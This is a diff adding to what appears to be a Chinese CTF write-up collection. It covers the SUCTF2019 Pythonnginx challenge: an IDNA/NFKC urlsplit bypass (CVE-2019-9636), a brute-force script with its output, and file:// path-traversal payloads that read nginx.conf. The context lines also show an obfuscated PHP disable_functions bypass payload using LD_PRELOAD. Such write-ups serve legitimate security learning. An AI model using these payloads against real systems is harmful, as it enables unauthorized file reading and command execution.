@@ -2376,3 +2376,117 @@ url解码之后就是 `?code=phpinfo();`
   2. 环境变量 `LD_preload + mail`劫持so执行系统命令，用蚁剑连接后，上传`./tools/bypass_disapblefunc_via_PRELOAD/bypass_disablefunc_x64.so`和`./tools/bypass_disapblefunc_via_PRELOAD/bypass_disablefunc_x64.php`
 
   重新构造payload:`?code=${%fe%fe%fe%fe^%a1%b9%bb%aa}[_](${%fe%fe%fe%fe^%a1%b9%bb%aa}[__]);&_=assert&__=include(%27/var/tmp/bypass_disablefunc.php%27)&cmd=/readflag&outpath=/tmp/tmpfile&sopath=/var/tmp/bypass_disablefunc_x64.so`
+
+## SUCTF2019 Pythonnginx
+
+1. 利用点
+
+    - CVE-2019-9636：urlsplit不处理NFKC标准化
+
+    - url中的unicode漏洞引发的域名安全问题
+
+    - nginx 配置文件位置
+
+        ```sh
+        配置文件存放目录：/etc/nginx
+        主配置文件：/etc/nginx/conf/nginx.conf
+        管理脚本：/usr/lib64/systemd/system/nginx.service
+        模块：/usr/lisb64/nginx/modules
+        应用程序：/usr/sbin/nginx
+        程序默认存放位置：/usr/share/nginx/html
+        日志默认存放位置：/var/log/nginx
+        配置文件目录为：/usr/local/nginx/conf/nginx.conf
+        ```
+
+2. 解题过程
+
+    前两个 if 判断 host是否含有 suctf.cc 如果有就报错，经过 utf-8 解码 idna 编码 之后传入到 urlunsplit函数 组合成url ，再用 if 和suctf.cc进行一次比较 如果相同 就 进行读取。
+
+    **方法一**
+
+    - idna与utf-8编码漏洞
+
+        idn 国际化域名应用，国际化域名(Internationalized Domain Name,IDN)又名特殊字符域名，是指部分或完全使用特殊文字或字母组成的互联网域名，包括中文、发育、阿拉伯语、希伯来语或拉丁字母等非英文字母，这些文字经过多字节万国码编码而成。在域名系统中，国际化域名使用punycode转写并以ASCII字符串存储。
+
+        什么是idna?
+        A library to support the Internationalised Domain Names in Applications (IDNA) protocol as specified in RFC 5891. This version of the protocol is often referred to as “IDNA2008” and can produce different results from the earlier standard from 2003.
+
+        ℆这个字符,如果使用python3进行idna编码的话
+
+        `print(‘℆’.encode(‘idna’))`
+
+        结果:`b’c/u’`
+        如果再使用utf-8进行解码的话
+
+        `print(b’c/u’.decode(‘utf-8’))`
+
+        结果:`c/u`
+
+        通过这种方法可以绕过本题
+
+    - *爆破脚本*
+
+        ```python
+            from urllib.parse import urlparse,urlunsplit,urlsplit
+            from urllib import parse
+
+            def get_unicode():
+                for x in range(65536):
+                    uni=chr(x)
+                    url="http://suctf.c{}".format(uni)
+                    try:
+                        if getUrl(url):
+                            print("str: "+uni+' unicode: \\u'+str(hex(x))[2:])
+                    except:
+                        pass
+
+            # 使用题目源码逻辑判断
+            def getUrl(url):
+                url = url
+                host = parse.urlparse(url).hostname
+                if host == 'suctf.cc':
+                    return False
+                parts = list(urlsplit(url))
+                host = parts[1]
+                if host == 'suctf.cc':
+                    return False
+                newhost = []
+                for h in host.split('.'):
+                    newhost.append(h.encode('idna').decode('utf-8'))
+                parts[1] = '.'.join(newhost)
+                finalUrl = urlunsplit(parts).split(' ')[0]
+                host = parse.urlparse(finalUrl).hostname
+                if host == 'suctf.cc':
+                    return True
+                else:
+                    return False
+
+            if __name__=="__main__":
+                get_unicode()
+        ```
+
+        ```python
+            # 输出结果
+            str: ℂ unicode: \u2102
+            str: ℭ unicode: \u212d
+            str: Ⅽ unicode: \u216d
+            str: ⅽ unicode: \u217d
+            str: Ⓒ unicode: \u24b8
+            str: ⓒ unicode: \u24d2
+            str: Ｃ unicode: \uff23
+            str: ｃ unicode: \uff43
+        ```
+        
+        从结果中随便选一个就可以绕过。
+
+        payload：`file://suctf.cℂ/../../../../..//usr/local/nginx/conf/nginx.conf`
+
+        **方法二**
+
+        利用urlsplit不处理NFKC标准化
+
+        payload: `file:////suctf.cc/usr/local/nginx/conf/nginx.conf`
+
+        *注意*
+
+        如果上面的payload不能用，可以在`suctf.cc`后加`../../../../../`尝试，多了没问题，少了不行。
